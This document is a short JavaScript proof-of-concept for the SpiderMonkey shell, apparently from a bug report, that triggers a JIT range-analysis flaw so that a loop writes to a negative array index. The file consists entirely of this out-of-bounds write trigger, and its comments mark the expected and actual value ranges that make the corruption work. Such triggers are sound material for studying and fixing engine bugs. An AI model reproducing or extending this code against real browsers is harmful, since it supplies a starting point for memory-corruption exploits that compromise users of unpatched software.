// ./js --ion-offthread-compile=off --spectre-mitigations=off PoC.js
function opt(karr, arr) {
    let objectKeysLength = Object.keys(karr).length;
    // Expected: [0, 0x0fff_ffff]; Real: [0, 0x7fff_ffff]; Trigger: 0x1000_0000
    let leftShift = objectKeysLength << 3;
    // Expected: [0, 0x7fff_fff8]; Real: [0x8000_0000, 7fff_fff8]; Trigger: 0x8000_0000
    let lowerBound = leftShift >> 31;
    // Expected: [0, 0]; Real: [0xffff_ffff, 0]; Trigger: 0xffff_ffff (-1)
    for (let i = 1; i >= lowerBound; i--) {
        arr[i] = 1.1;
    }
}

let arr = [];

for (let i = 0; i < 10000; i++) {
    arr[i] = i + 0.1;
    opt(arr, arr);
}

for (let i = 0; i < (1 << 28); i++) {
    arr[i] = i + 0.1;
}

let a = [123.1, 456.1, 789.1];

print(opt(arr, a));
